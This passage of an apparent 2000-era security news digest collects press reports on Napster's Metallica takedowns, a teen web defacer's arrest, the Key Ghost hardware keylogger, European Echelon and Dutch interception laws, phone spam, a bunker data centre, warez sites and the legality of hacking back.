      will take down all users Metallica has alleged, under penalty of perjury, 
      to be infringing."

      The company said users who feel they have been banned by mistake will be 
      given the opportunity to submit a "counter notification" form.

        
      Metallica obtained the users' IDs by monitoring the service over a two-day 
      period. Napster said it did not give Metallica personal information, such 
      as names and addresses, about the users who have been kicked off.

      Metallica's attorney said last month that the band submitted the names at 
      Napster's request.

      Dr. Dre also filed suit against Napster last month.

      The ban will only extend to users who shared versions of commercially 
      released songs and would not apply to "bootleg" recordings made at 
      concerts.

      Napster's Press Release:
      ~~~~~~~~~~~~~~~~~~~~~~~

      http://www.napster.com/metallica-notice.html

      Information About Metallica's Request To Disable Napster Users

      On Wednesday, May 3, 2000, Napster received a delivery from the band 
      Metallica of 13 boxes of paper notifying us of Napster users alleged to be 
      infringing Metallica and its related entities' copyrights. On Thursday 
      afternoon, May 4, Metallica sent computerized lists of 317,377 Napster 
      user names alleged to be infringing Metallica's copyrights. Metallica has 
      requested that, in compliance with the notice and takedown policies 
      outlined in the Digital Millennium Copyright Act ("DMCA"), Napster act 
      expeditiously to disable all of these users.

      We intend to fully comply with the DMCA and our policies. We will take 
      down all users Metallica has alleged, under penalty of perjury, to be 
      infringing.

      Conversely, the DMCA affords certain protections to users. Namely, a user 
      who is banned from the service deserves the opportunity for reinstatement 
      in the event that there has been a genuine mistake or misidentification of 
      the materials made available by that user. Users who feel they have been 
      banned as a result of a mistake or misidentification of content may submit 
      a "counter notification" form.

      The Napster software will direct all users barred as a result of 
      Metallica's allegations to an infringement notification page. That page 
      explains the notice that Metallica has given us, explains who Metallica 
      has stated to us it intends to block, and gives the user an opportunity to 
      submit a counter notification if the user has been misidentified. If the 
      user has been misidentified, and requests to be reinstated by submitting a 
      counter notification under penalty of perjury, then, unless Metallica 
      chooses to pursue legal action against that user within 10 working days of 
      being notified of that user's counter notification, the user is entitled 
      to be reinstated.

      We at Napster respect the privacy rights of our users. We currently keep 
      our users' personal information, including personal names, e-mail 
      addresses, street address, or other data separate and distinct from users' 
      Internet activities. That information was not disclosed to Metallica, or 
      to its related business entities Creeping Death Music, or E/M ventures, or 
      any other entity. Napster collects information at registration solely for 
      the purpose of better understanding who its audience is. Of course, if you 
      subsequently send Napster e-mails, other correspondence, or a "counter 
      notification" that identifies both your user name and your real name or 
      e-mail address, that information does become recorded in combination.

      Because of the methods employed by Metallica in assembling its list of 
      usernames, it is possible that users have been mistakenly implicated as 
      infringing the copyrights of songs and recordings originally included on 
      commercially released Metallica albums. It is also possible that Metallica 
      has correctly identified many users. Napster will reinstate those users 
      who dispute Metallica's allegation of infringement via a sworn "counter 
      notification" stating that they have not shared the materials to which 
      Metallica objects, and who, after submitting the counter notification, are 
      not made the subject of legal action by Metallica within ten (10) working 
      days after Metallica is notified of that person's identity.

      Frequently Asked Questions About Metallica's Request (FAQs)

      Q: What information has Napster received from Metallica?       
      
      A:  Metallica delivered a computerized list of 317,377 distinct usernames
         to be banned from Napster. The list contained usernames, filenames of 
      allegedly infringing music for each user, time, date, and the IP address 
      of the Napster server to which the user was connected. That information 
      did not contain the user's IP address or personal information. Metallica 
      has stated that it intends to limit the scope of its notification to 
      commercially released Metallica albums, making "no claim of infringement 
      with respect to recordings of songs made by fans at Metallica live 
      concerts."

      Q: How has Napster responded to this request? 
      A: As a DMCA compliant service, Napster feels strongly that it is 
      important to expeditiously remove users alleged with copyright 
      infringement. Napster has blocked all users identified by Metallica
      as allegedly infringing, based on Metallica's sworn allegations against
      these usernames. If, but only if, these users feel that they have been 
      identified in error, they have recourse through our counter notification
      policy.

      Q: Has Metallica requested any personal information related to Napster's 
      users? 
      A: No, and no such information has been provided to them.

      Q: What does Napster do with personal information provided at 
      registration?  
      A: Napster archives personal information, such as user addresses,
       e-mail addresses, and the like, to use as general demographic 
      information for audience measurement purposes. We do not currently 
      associate a user's personal information with their Napster username.

35.0 [MM] ytcracker busted for web defacement
     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     
     http://www.gazette.com/daily/top3.html
     
     Teen accused of raiding city Web site

     By Danielle Nieves/The Gazette
     Edited by Mike Braham; headline by Gary Houy

     A 17-year-old Colorado Springs boy
     was charged in juvenile court
     Tuesday with one count each of
     computer crime and criminal mischief
     after he broke into the city's Web
     site in October and replaced it with
     the message, "i love this city
     ytcracker 9d9 palmer high."

     The two felony charges carry a maximum penalty of two
     years of juvenile detention.

     The boy, known online as "ytcracker," said he is a
     benevolent hacker who was trying to alert officials of
     potential security glitches.

     After discovering he had tapped into the city's Web site
     in October, Colorado Springs police began an
     investigation and said he had tampered with at least 40
     other Web sites, including Airspace USA, Altamira
     International Bank, Nissan, Honda, the U.S. Geological
     Survey Monitoring Station and the Texas Department of
     Public Safety.

     In December, not knowing of the investigation,
     "ytcracker" contacted the National Aeronautics and
     Space Administration and told them he had meddled
     with their Web site.

     The agency teamed with Springs police, the Defense
     Criminal Investigative Service, the NASA computer crime
     division and the Texas Department of Public Safety to
     gather information that led to the felony charges.

     "I never had any intentions of doing damage," he said.
     "At first it was funny, and then I wanted to alert people
     to the security vulnerabilities in everyday software - and
     the fact that no one is immune."

     The boy said what began as a joke last summer turned
     into a precarious game between administrators of online
     Web sites and his own expertise. He said he started
     hacking into local business sites, then graduated into
     more complicated systems, like the Bureau of Land
     Management National Training Center.

     The Web sites he affected were typically dismantled for
     only a matter of hours, he said. Police said he caused
     $25,000 damage, a figure based on the costs of
     installing secure sites and the time lost to users while
     the software was repaired.

     The teen, who dropped out of school because he was
     "too bored," is a self-taught computer whiz who said he
     started using a computer when he was 2 years old.

     "I understand what I did was wrong," he said. "I'm
     hoping something good will come out of it."

     by Ellen Messmer

     (IDG) -- ISS has developed an intrusion-detection application, code-named 
     Bullet, that lets e-commerce companies scan a Web site visitor's PC to see
     if it is infected with Trojan horses, such as Back Orifice, or viruses that
     could be passed on to the e-commerce site.
     

     Trojan horses let intruders seize remote control of PCs, and that could mean
     a compromise of an online banking system, for example, even when the correct
     user identification is employed to access the site.      
  
     "Businesses are just getting fed up with the crap coming off the Internet," 
     says ISS CEO Thomas Noonan, adding that one bank is expected to announce it 
     is using the ISS application on its home banking site this week. 

     The ISS application uses ActiveX technology to scan the laptop, and if 
     required, wipe out the unwanted, dangerous code. Noonan acknowledges that
     use of the scanning application could touch off an invasion-of-privacy debate. 

     Further details about the application were not available. ISS has not announced
     when the application will become generally available or how much it will cost.

     Before you press the return button, check you're not bugged. Will Knight 
     reports.

     A tiny device that can be hidden within a keyboard or a PS/2 plug and secretly
     record half a million user keystrokes has been launched by New Zealand hardware
     manufacturer, Working Technologies. 

     Unlike most surveillance technologies, 'Key Ghost' does not require any 
     software to be covertly installed. All data is stored directly on the device and
     can be summoned by entering a "Personal Unlock Code" (PUC) through a keyboard. 
     
     The device can then be removed and the information retrieved by another computer. 

     The most obvious application of this technology is to capture usernames and 
     passwords or data that has been encrypted or otherwise protected on a machine.
     Working Technologies also markets the add-on as a handy data recovery tool. 

     Working Technologies says the FBI uses similar technology to carry out computer
     surveillance. 

     Key Ghost devices cost between $99 (£62) and $309 (£195).

44.0 [HNN] EU Set To Rewrite Human Rights 
     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

     contributed by g.machine 
     Rules and treaties originally drawn up fifty years ago to outline
     basic human rights failed to anticipate advancements in technology.
     Now the European Union is attempting to rewrite those rules which
     would included a ban on 'systematic interception' of electronic
     communications. This would essentially ban Echelon and Frenchelon.
     (Why do the Europeans seem to understand privacy so much better than
     US lawmakers?)

     Flaw In Human Rights Uncovered

     Duncan Campbell    08.04.2000 
     
     Proposals for a new definition of human rights now before the European
     Parliament would ban ECHELON and update data protection rules to latest
     developments in telecommunications technology. 

     International spying on communications should be identified as a breach
     of fundamental human rights, according to proposals now before the 
     European Parliament. The new proposals suggest that treaties and rules 
     on human rights drawn up 50 years ago or more failed to anticipate how,
     in the Internet age, threats to personal privacy can easily cross 
     international boundaries. 

     According to the five page proposal, all future interceptions must 
     "have a legal basis, be in the public interest and be strictly limited
     to the achievement of the intended objective". 
    
     "Any form of systematic interception cannot be regarded as consistent
     with that principle, even if the intended aim is to fight against 
     international crime". 
     
     "Any Member State operating such a system should cease to use it". 
  
     If implemented internationally, the new extension of human rights would
     outlaw the practice of signals intelligence (sigint), except when used 
     to fight crime or terrorism. Sigint systems are now used by many large 
     countries to spy on the diplomatic, commercial and personal communications
     of allies as well as enemies. The proposals are likely to be particularly 
     bitterly fought by the British government, whose sigint agency GCHQ 
     co-operates with the US National Security Agency to run the world's 
     largest communications intelligence system, including ECHELON. 

     MEPs will be asked to endorse proposals intended to eliminate cross-border
     spying between European nations as well as by nations outside the Union. 
     The plans follow two recent parliamentary discussions about international
     communications surveillance, and in particular the US-run Echelon network,
     which collects phone call, fax and data communications from satellite 
     communications links. 

     According to proposals prepared by Graham Watson, chairman of the EP 
     Committee on Citizens' Freedoms and Rights, Justice and Home Affairs,
     the existing framework of human rights is defective. They "fall short
     of what the citizens of Europe are entitled to expect, since they do 
     not protect them from interceptions carried out by a Member State of 
     which they are not nationals". 

     "European citizens, irrespective of their nationality, are guaranteed 
     fundamental rights at the highest possible level", Watson asserts. 

     If the resolution is passed by the full Parliament at a meeting in 
     Strasbourg later this month, the EU's president will be told that there
     is an "urgent need" for the Council "to take ... necessary diplomatic 
     steps to prevent third countries from carrying out any form of 
     interception on the territory of the Union outside the framework of
     the joint fight against organised crime". The President will be asked
     to commence diplomatic negotiations with the United States and other 
     countries "to put an end to all forms of systematic and general 
     espionage by third countries vis-à-vis the activities of the Member
     States of the Union, its institutions and its citizens". 

     It adds "even in the case of the fight against cross-border crime,
     adequate safeguards governing interceptions should be drawn up" and
     that "any form of interception by a Member State should be notified
     to the Member States on whose territory the persons whose communications
     are being intercepted are present". 

     The resolution also expresses irritation with "the current piecemeal
     nature of the relevant laws and operational and organisational 
     arrangements" affecting interception in Europe. The "piecemeal 
     arrangements" include Schengen, Europol, and the Customs Convention.
     According to Watson, these entail "different standards of protection"
     and are "free of any real democratic and judicial scrutiny". Six of 
     15 EU states had also failed to comply with the EC directives on data
     protection and on the privacy of telecommunications data. 

     The Committee also complains that the problems have been raised in the
     "numerous written and oral questions tabled on this subject over the 
     last two years". 

     The proposals follow a two day hearing on data protection and 
     surveillance, held in Brussels in February, and  statements made to
     the Parliament by the EC and Council of Ministers at the end of March. 

     The Citizens Rights' Committee president is also presenting the lack
     of formal international communications and data privacy as a global 
     problem. "On a world-wide scale, the rise of the information society
     has not been accompanied by a corresponding revision of provisions on
     data protection by the Council of Europe, the OECD and the WTO", he 
     says. The proposals call for UN guidelines on personal data and OECD
     guidelines on privacy to be "given the status of binding texts - at 
     the very least between the States of the Union and their allies". 

     The new proposals do not include the appointment of a special  
     Committee of Enquiry by the European Parliament, a proposal put forward
     last month by the Green Parties and their allies. Such a committee might
     have been limited to looking at breaches of existing European community 
     law. Instead, Watson has asked that his and two other committees be asked
     to prepare, by the end of the year a new and detailed report on the 
     problem of data protection and interceptions.

45.0 [HNN] Dutch Want Their Own Echelon 
     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

     The Dutch Parliament is currently debating a bill that will give
     increased powers to the Dutch Intelligence Agency BVD. If passed the
     bill would allow the agency to intercept satellite communications at
     random and search the intercepted traffic by keywords.

     Echelon in Holland

     Jelle van Buuren   11.04.2000 Dutch intelligence agency authorized to scan 
     satellite communications 

      The Dutch Intelligence Agency BVD is getting new powers. Among other 
      things, the powers to intercept communications will be extended. The 
      agency is authorized, if the government gets its way, to intercept 
      satellite communications at random and search the intercepted traffic by 
      keywords. Also, the BVD gets a new intelligence task: the gathering of 
      economical information. Holland goes Echelon, it seems. 

      The new 'Act on the intelligence and security agencies' (WIV), which is 
      currently debated by Dutch parliament, gives the powers of the BVD a new 
      legal basis. Actually, it means mainly the extension of investigative 
      powers. In each amendment on the original proposal, new powers are given. 
      For instance, in the first draft of the new Act, the BVD got the power to 
      intercept, record and listen into telecommunications. In the latest 
      amendment, from the beginning of this year, the power to 'receive' 
      telecommunications was added. This means the BVD is authorized to directly 
      pluck telecommunications, for instance GSM-traffic, out of the air. In 
      this way, the BVD is no longer dependent on the willingness of telcom 
      operators to intercept traffic, but can create for instance their own 
      parallel network of receivers to intercept all GSM-traffic. Also, this 
      prevents providers from 'leaking' about the fine work the BVD is doing in 
      this area. 

      The biggest extension, however, is the newly added article 25a. In this 
      article, the BVD is authorized to intercept at random all international 
      telecommunication that is not cable bound and scan the intercepted 
      communication on items of interest (persons, groups, keywords). According 
      to the explanatory note by the draft Act, this kind of random interception 
      is needed to investigate if by any chance interesting messages are part of 
      the international communication. 

      The government says nonchalantly that it can't be prevented that in this 
      manner the BVD gets acquainted with the content of the intercepted 
      communications, although that isn't - still according to the Dutch 
      government - the main purpose of the random interception.       

       "The searching is primarily an instrument for the reconnaisance of the 
       communication, to try to establish the nature of the communication and 
       the identity of the person or organisation that is communicating. That in 
       this way the agency gets acquainted with a part of the content of the 
       communication is inevitable, in order to establish who is communicating 
       and if it's a person or a group that has the interest of the agency. The 
       searching however is not directed to get acquainted with the full content 
       of the communication. In a certain way, this activity is comparable with 
       the listening in on telephone conversations, to check if the connection 
       is allright."         

      
      This seems like a very creative way of saying that interception isn't 
      really interception, but a mere technical testing of connections. And for 
      that, no legal or governemental warrant is needed... 

      
      Keywords 
      
      As important parts of the international telecommunications are transmitted 
      by satellites and beam transmitters, it is clear this article 25a 
      authorises the Dutch BVD to intercept all these communications. This means 
      an uncontrolled authority to intercept and scan all communication that is 
      not cable bound. This can have a great impact on the Internet traffic. As 
      a message on the Internet chooses the least busy route, and the heart of 
      Internet lays in the United States, there is a big chance that email send 
      within the Netherlands chooses an international route by satellite. In 
      future this can also be the case for telephone conversations. All these 
      messages can be intercepted and randomly searched. Even now, the phone 
      conservations between two big Dutch cities, Amsterdam and Rotterdam, are 
      being transmitted by beam transmitters. 

      In the first draft of the WIV, the Home secretary had to give permission 
      to the keywords the intelligence agency is using to scan the intercepted 
      traffic. In the latest amendment, the Home secretary only gets once a year 
      notification of the list of keywords, whereas the BVD is authorized to add 
      new keywords to its own discretion. 

      Besides that, the BVD is authorized to store all intercepted 
      communication. Where the first proposal of the Act stipulated that the BVD 
      has to destroy immediately all intercepted communication that isn't of 
      interest for them, the new amendment gives the BVD the right to store all 
      intercepted communication for a year. 

      In this way, the Dutch government is creating its own mini-Echelon. The 
      BVD uses for its interception tasks the facilities of the Technical 
      information processing centre (TIVC) of the Navy intelligence. This 
      centre, located at the Navy complex Kattenburg in Amsterdam, decodes 
      satellite traffic that is being intercepted by different ground stations. 
      The TIVC is working the same way as its big brother NSA, as showed by the 
      publication of internal documents in the Dutch daily De Haagse Courant in 
      1985. Satellite conversations were intercepted, recorded and selected by 
      keywords for further analysis. The intelligence the TIVC gathered was sent 
      to the Foreign Intelligence Service (IDB), till this unit was closed down 
      in 1994 after a serie of scandals. Since than, all signal intelligence is 
      in the hands of Navy intelligence. 

      According to a study of two Dutch Intelligence experts (Bob de Graaff and 
      Cees Wiebes, Villa Maarheeze, 1998), the TIVC is part of a broader 
      international network and works closely with other Western agencies. For 
      instance in 1972, the TIVC reported to the Mossad that Egypt and Libya had 
      developed a telephone- and telex-connection under sea. Israelian special 
      forces destroyed this connection, so Egypt and Libya had to communicate 
      again by satellites, which were an easy target for interception. According 
      to the authors, the American CIA protested in 1992 firmly against the 
      immanent dissolution of the IDB, because they were afraid Dutch signal 
      intelligence capacity would diminish. 

      
      Vital economic interests 

      
      The new power to intercept satellite communications at random will 
      undoubtfully be used for economic espionage. In the past, the signal 
      intelligence capacity already served economic purposes. In the above 
      mentioned study of the intelligence experts, examples of this are 
      mentioned. The authors speak of an "incestious relation" between the 
      intelligence services and Dutch industry. Leading persons of big dutch 
      companies, with establishments abroad, worked for the IDB. In exchange, 
      they got economic intelligence gathered by the TIVC. The Dutch 
      multinational Philips has, according to the study, close relations with 
      Dutch intelligence. The company installed interception devices in 
      telephone centres it sold to foreign companies and governments, the report 
      says. 

      In the proposed new 'Act on the intelligence and security services', the 
      BVD gets officially the task of economic intelligence gathering. The BVD 
      has to "protect vital economic interests", which is seen as a part of the 
      national security. 

      

       "The Dutch economy is highly dependent of economic developments in the 
       world; these developments are characterised by increasing 
       internationalisation and globalisation. Decisions taken elsewhere, can 
       have a sincere impact on the Dutch economy. It is possible to gather 
       intelligence on these developments in different ways, for instance by 
       cooperation with intelligence agencies of other countries. These agencies 
       however, wil take in account their own interests. In order not to be 
       dependent of information of third parties, the government thinks it is 
       necessary to build up its own information position and enforce it."         

      
      What excactly 'vital economic interests' are, is however wrapped in a 
      cloud of mystery.       

       "To end with, we remark that with the explicitation of 'vital economic 
       interests of the Netherlands' in the terms of reference of the BVD, also 
       the possibility is created - if it seems appropriate - to conduct 
       investigations in this area, where national security as such isn't in 
       danger or is difficult to argue for."   
      

      Encryption 

      
      The new powers of the BVD are also interesting because some articles are 
      related to cryptography and information technology. The BVD is authorized 
      to break into homes and offices to bug keyboards. Besides that, the BVD is 
      authorized to break into computers and steal, alter or delete information 
      that is stored in computers. In other words, the BVD is allowed to hack. 
      In this way, the intelligence agency can steal data from computers, 
      manipulate software, corrupt passwords or install a Trojan Horse, so 
      access is secured and cryptography can be bypassed. 

      Cryptography is a topic of special interest for the BVD. In the draft Act, 
      the power to undo encryption is being extended. In the first proposal the 
      BVD got the authority to decrypt encrypted communication and data "by 
      technical means". In the latest amendment this is extended to decryption 
      "by all possible means". According to the explanatory note, "practice has 
      shown there are other ways than just technical means to decrypt encrypted 
      communications." 

      This cryptic description seems to be directed at infiltrators who diddle 
      out passwords, or look over the shoulder when messages are encrypted, or 
      intelligence teams breaking into homes and offices in search of the little 
      piece of paper the password is written on. 

      The articles on the interception of telecommunication also contain remarks 
      on cryptography. Encrypted messages may be kept in storage as long as is 
      necessary for the BVD to decrypt them. The explanatory note says: 

      

       "Where telecommunication is concerned, of which the encryption is not 
       undone, and where the mere fact that cryptography has been used makes 
       this communication interesting for the agency, it is desirable to save 
       this communication to the moment the capacity exists or is being 
       developed to decrypt the communication."         

      
      So the use of a perfectly normal technique to protect ones privacy, trade 
      secrets or sensitive political information, is in the eyes of the Dutch 
      government a highly suspected act. 

      The draft Act also introduces the obligation for "every one" the 
      authorities believes has acces to the keys, to cooperate with the 
      intelligence agency in decrypting the encryption. Refusal is punishable 
      with a sentence of two years. The Dutch parliament has asked the 
      government if this means that suspects also are obliged to hand over the 
      keys. 

      The answer is not available yet. But if the governement confirms this 
      obligation also applies to suspects, this will be a clear violation of the 
      fundamental human rights, as stated for instance in the Treaty on the 
      protection of the Human Rights and Fundamental Freedoms. It means an 
      obligation to cooperate on your own condemniation and the reversal of the 
      burden of proof.

46.0 [HNN] SPAM Goes Wireless 
     ~~~~~~~~~~~~~~~~~~~~~~~~

     contributed by Evil Wench 
     Unsolicited commercial email is finding new ways of interrupting our
     lives with their unwanted and unwelcome messages. Companies are now
     using wireless messaging services to page people with advertisements
     for their products. the company responsible for the SPAM, plugout.com,
     said that it was only a one time occurrence and will never happen
     again. (That's one time too many, if everyone did it one time...)

     'Spammers' New Calling: Cell Phones     

      By Mike Musgrove Washington Post Staff Writer Tuesday, April 11, 2000; 
      Page E01 

      Mike Malarkey, a business-development manager for the District-based 
      educational Web developer Blackboard Inc., was in the middle of a meeting 
      last Thursday when his Nokia cell phone chirped, sounding a bit like the 
      low-battery warning. 
      
      When he checked it after the meeting, he saw that the battery was fine, 
      but he'd just received a text message on the phone's screen--an 
      advertisement for a Web site selling cell-phone accessories.
      
      "I'm just surprised that it's progressed to phones," said Malarkey. He was 
      one of the first recipients of an apparently novel kind of unsolicited 
      electronic advertising, or "spam," sent via the text-messaging service on 
      his ATT Wireless phone.
      
      Another ATT customer, Laurie Ann Ryan, a public relations director who 
      asked that her firm not be identified, was infuriated to receive the same 
      message last Thursday: "Clearly the sender knows it's going to interrupt 
      somebody's day." She called the ad "excessively aggressive and invasive" 
      because a cell phone is something users tend to carry with them all 
      day--unlike the personal computers that e-mail spammers have targeted for 
      years.
      
      One veteran of the long-running fight against spammers said this abuse of 
      ATT's system should come as no surprise. "I expect to see more of it 
      unless this kind of thing is controlled," said Nick Nicholas, an 
      "evangelist" at the Mail Abuse Prevention System, an organization that 
      tries to get Internet providers to cut off spammers' access.
      
      Nicholas noted ATT Wireless's configuration of its text-message system as 
      a possible vulnerability: Its customers automatically get an e-mail 
      address consisting of their phone number followed by "@mobile.att.net." 
      "Because of the way ATT sets up the e-mail account, all you need to do is 
      just try consecutive numbers," he said. Nicholas said ATT should have been 
      able to detect this "war dialing" approach and block the spammers' access.

      
      ATT spokeswoman Alexa Graf hadn't heard of Plugout.com's unsolicited 
      transmission until a reporter called yesterday afternoon. "The last thing 
      we want to do is start spamming our customers," she said.

      
      The text messaging service is an included feature with ATT's service; 
      customers are not billed for incoming text messages. Sprint PCS offers a 
      similar service, while Verizon Wireless (formerly Bell Atlantic Mobile), 
      Nextel and Cellular One charge extra for the ability to receive text 
      alerts.

      
      A spokesman for Sprint PCS reported no spamming incidents and said, "We 
      have software that can detect a spam and is designed to prevent it from 
      happening."

      
      The company behind the ad, Plugout.com, is a Fort Lee, N.J.-based 
      operation whose site has only been fully operational since February.

      
      Rudy Temiz, the company's 22-year-old president, said yesterday afternoon 
      that he didn't plan to repeat the exercise but expressed no remorse 
      either, saying that the marketing technique had generated "quite a few" 
      sales.

      
      "One of the reasons we're doing this," said Temiz, "is because every 
      single dot-com company isn't graced with venture capital and all us 
      smaller Web sites have to find more creative ways to get on the map." He 
      didn't reveal how many messages had been sent out or how he had obtained 
      his list of phone numbers but said, "We're only doing it one time. Nobody 
      in Washington, D.C., should ever hear from us again."

      
      Nicholas, the anti-spammer, called Temiz's marketing, "more ignorance than 
      anything, ignorance of the economics of the Internet or of the culture of 
      the Internet."

      
      Vincent Zahn, Plugout.com's director of strategy, further defended the 
      text ads. "What better way to reach your target market?" he asked, saying, 
      "We look at it as if we're doing these people a favor if they're looking 
      for these kinds of products."

      
      Responded ATT customer Ryan, "They're not doing me any favors by 
      soliciting me over my cell phone."

     RedWood City California based Equinix has just opened its bomb proof
     Net shelter. The shelter is said to be more secure than Fort Knox to
     protect the servers of third party companies housed inside. The
     compound includes geometric hand-scanners, automated mantrap and other
     fancy security devices. Equinix has already built two such shelters on
     the East Coast and plans on 26 more throughout the county. (While
     Equinix may have the physical security they do not provide any
     Internet security. Doh!)

     http://www.equinix.com
     
     Wired:
     
      Net Fort Opens to Mixed Reviews 
      by Lynn Burke 3:00 a.m. Apr. 12, 2000 PDT SAN JOSE, California -- The 
      opening of the new bomb-proof Internet shelter here Tuesday was a bit like 
      a Mafia wedding that couldn't decide whether it wanted to be top-secret or 
      front-page news. In the end, it ended up being neither. 

      The shelter, operated by Redwood City, California-based Equinix, is billed 
      by its owners as a Fort Knox-like bunker that will protect the very 
      infrastructure of the companies fueling the electronic economy of the 
      United States. 

      Unfortunately for Equinix, the San Francisco Chronicle plastered the 
      top-secret location of the facility on its front page Tuesday morning. But 
      even if the unmarked shelter is no longer such a secret, the sprawling 
      compound -- chock-full of fancy security devices including geometric 
      hand-scanners and automated mantraps -- does appear capable of protecting 
      the computers housed inside from physical attack. 

      But is the Internet under threat of such assault? Former National Security 
      Advisor Mike McConnell sure thinks so. 

      "Look at the World Trade Center bombing," he said. "The purpose of that 
      attack was to collapse Wall Street. If I'm the blind sheik (accused in the 
      attack), I say, 'Well, that didn't work.'" 

      Going after the bank is no longer a worthwhile strategy, he said. Now you 
      go after the bank's computers. 

      "If you're measuring e-commerce in billions and trillions," he said, "what 
      Equinix has provided here, in my view, is an absolute must." 

      Benchmark Capital analyst Andy Rachleff, whose company helped to pony up a 
      good chunk of the $80 million secured for second-round financing, says 
      Equinix has hopped in front of a security trend in e-business. 

      "This is monstrous," he said. "If you're going to put your business on the 
      Internet, you're going to put your servers in a facility like this." 

      The building, a renovated version of a former IBM facility, was rebuilt by 
      Bechtel Corporation, the brawn behind the Hong Kong International Airport 
      and Boston's Ted Williams Tunnel. Bechtel has entered into a $1.2 billion 
      contract to build 26 more of these hosting facilities. The company has 
      already built two on the East Coast -- in Virginia and New Jersey. 

      Jeff Thompson, a software developer for operating systems security 
      platforms provider Argus Systems, says sinking a bunch of capital into 
      this kind of facility is crazy. 

      
      The security industry isn't focused on external threats, he says. 

      "It's so much easier to break in over the public network," he said. "The 
      real problem is how easy it is to attack a system on a public network." 

      Indeed, the denial-of-service attacks earlier this year on several of the 
      Internet's biggest players were all electronically perpetrated over the 
      Internet itself. And Equinix officials say their facility won't prevent 
      those kinds of attacks. 

      "That's something our customers need to work out themselves," said vice 
      president of sales Peter Ferris. 

      There's little doubt that the industry is worried about security, physical 
      or otherwise. 

      According to a recent survey of Fortune 1000 corporate security 
      professionals by security corporation Pinkerton, the potential threat to 
      Internet sites and computer networks was identified as the industry's 
      second-biggest security concern. 

      A recent survey from the Computer Security Institute and the San Francisco 
      Federal Bureau of Investigation's Computer Intrusion Squad found that 90 
      percent of respondents -- primarily large corporations and government 
      agencies -- detected computer security breaches within the last 12 months. 

      While no one knows whether a campaign of terror against the Internet is in 
      the works or not, it may just be that a facility like Equinix's provides a 
      little extra measure of comfort in an industry that is defined by 
      volatility. 

      Bobby Robertson, a business developer with broadband provider Enron, said 
      Equinix has taken security to a whole new level, and has come up with the 
      most sophisticated hosting service he's ever seen. 

      "It's reassuring, for sure," he said. "I think security is very important, 
      and this is a very thoughtful approach."

      Speaking in Sydney Australia last week, the president of the Business
      Software Alliance, Mr Robert Holleyman, said there were at least
      690,000 warez, appz and crackz Web pages on the Internet. (690,000?
      Who went around and counted them all? By the time they finished half
      of them were probably down.)

      Pirates display their booty on the isle of Zed
      Date: 11/04/00
      
      By PETER GOTTING
      
      If you thought X-rated was bad, just wait till you see the Zs.

      On the dark side of the Internet, the letter Z is used to pluralise almost 
      anything that is illegal.

      Thus, warez, appz or filez refer to pirated software, computer games, 
      music and film downloads; serialz are software serial numbers and 
      passwordz are passwords that allow free entry to subscription-based 
      pornography sites.

      For years, Internet users have swapped warez online. Those in the know can 
      easily find a free copy of applications such as Windows 2000, Adobe 
      Photoshop and Corel Draw; computer games such as Quake 3, KingPin and 
      Soldier of Fortune; and even movies such as Scream 3, Star Wars and Green 
      Mile. On a serialz page you can retrieve serial numbers for anything from 
      first aid computer programs to multimedia software.

      And throughout the sitez are banners advertising pornography and links to 
      pages listing passwords to XXX material.

      "The best illegal downloads" one site advertises; "Illegal MP3 arena" 
      another calls itself; "100% Illegal Pirated O-Day" one boasts.

      The sites are nothing new, but copyright owners are getting scared. With 
      technological developments set to make it much easier to break the law - 
      broadband will reduce download times dramatically - software companies are 
      concerned.

      Speaking in Sydney last week, the president of the Business Software 
      Alliance, Mr Robert Holleyman, said there were at least 690,000 warez, 
      appz and crackz Web pages on the Internet.

      The Business Software Alliance - an international industry body 
      representing software companies such as Microsoft, Lotus, Adobe, Novell 
      and Symantec - estimates Internet piracy now involves more than $US1 
      billion ($1.67 billion) worth of software worldwide.

      Mr Jim Macnamara, chairman of the alliance's local counterpart, the 
      Business Software Association of Australia, said technological 
      developments such as broadband and faster modems would aggravate the 
      problem.

      "It's all necessary for the e-commerce revolution to happen," Mr Macnamara 
      said. "But, equally, we are concerned because illegal software will be 
      easier to access."

      The sites are not hidden but quite blatant, Mr Macnamara said.

      "They are quite unashamed. They do not do anything else. They openly boast 
      of what they have got on them."

      A disclaimer on one site warns: "If you are affiliated with any 
      government, anti-piracy group or any other related group, or were formerly 
      a worker of one, you CANNOT enter this Web site, cannot access any of its 
      files and you cannot view any of the HTML files."

      The sites say that threats against Internet service providers or 
      prosecutions of people affiliated with the page would breach the US 
      Internet Privacy Act.

      Mr Macnamara suggested Internet service providers should be required to 
      compile contact details of Web sites owners which would be available to 
      police but not the public.

      "Individual privacy should be protected but the hosts of sites should be 
      required to keep a record of who owns that site," he said.

      "If you get a court order you should be able to locate who is doing that 
      and press charges.

      "Often we do not even know where they are because there's no records 
      kept."

      But the organiser of hackers group 2600 Australia, Mr Grant Bayley, said 
      most of the sites were hosted on free Web page hosting sites such as 
      Geocities and Angelfire, rather than through ISPs.

      "A change in law won't achieve any of their objectives," he said.

      Mr Bayley said 2600 did not condone any of the sites. Hackers were 
      interested in computer security and not breaking the law; crackers access 
      software illegally.

      "The number of sites alleged to exist seems grossly exaggerated," he said.

      But Mr Bayley suggested software companies should provide more programs to 
      consumers on a free trial basis.

      "It's a problem of not offering enough of a sample," he said. 

      "People operating such sites are often under the age of 18 and do so more 
      out of interest in a product than a desire for professional gain. These 
      are people wanting to try out the software."

      Just how legal is it to launch a counterattack against an online
      attacker? Would you be committing just as big a crime as they are? How
      can you be sure you are counterattacking the correct target? Should
      laws be passed to legalize hostile responses?

      Can you counter-attack hackers?
      From...

      (IDG) -- You are running a Web site. Making money perhaps, and visitors 
      are seeing your message. Then, according to your perimeter 
      intrusion-detection device, some online goofball or criminal hacker is 
      beating on your door. What are you going to do? 

      In September 1998, the Pentagon reacted to a browser-based 
      denial-of-service attack by the hactivists Electronic Disruption Theater 
      by using offensive applets to shut down the attacking browsers. Clean. 
      Quick. Effective. But the Pentagon lawyers went ballistic within minutes. 
      The techies defending the Pentagon servers had broken too many laws to 
      enumerate - including a military prime directive, "posse comitatus," which 
      forbids the military from taking unilateral actions within the U.S. and 
      against U.S. citizens. 

      In addition, the techies by their actions had committed several federal 
      felonies for which hackers have gone to jail.

      The simple truth is that it is illegal to disarm your online assailant. 
      Doing so requires that you take some offensive action - send out hostile 
      applets, return fire with your own denial-of-service tools or anything 
      else that will shut down the attack. The net effect is that both the 
      attacker and the victim (who is attacking back) are breaking the law. 

